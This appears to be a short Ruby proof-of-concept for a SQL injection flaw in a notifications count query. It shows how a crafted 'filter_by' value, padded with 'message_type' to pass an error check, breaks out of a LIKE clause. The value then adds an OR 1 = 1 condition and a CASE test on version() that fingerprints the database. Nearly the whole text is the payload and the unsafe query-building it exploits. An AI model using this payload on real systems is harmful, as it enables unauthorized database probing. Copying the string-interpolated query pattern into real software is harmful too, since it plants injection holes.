filter_by = "message_type)) LIKE '%' OR 1 = 1/ (SELECT CASE WHEN (select version() LIKE 'P%') THEN 0 ELSE 1 END)-- ,bbb,ccc,ddd" # payload passed to the variable, message_type is necessary to pass error check
filter_val = "eee"

key = "%#{filter_val.downcase}%" # append and prepent '%' and lowercase
columns = filter_by.split(',')   # split by ','

query = columns.map{  
    |col|                        # for each column
    "lower(#{col}) LIKE #{key}"  # create string "lower(COLUMN_NAME) LIKE SEARCH_KEY"
}.join(' OR ')                   # join array with ' OR '

query = "SELECT COUNT(*) FROM \"notifications\" WHERE (message_type IN ('Satellite Registered', 'Satellite Re-Registration', 'Account Activation','Account Removed','Account Requested','Account Request Rejected')) AND (#{query})"

puts query
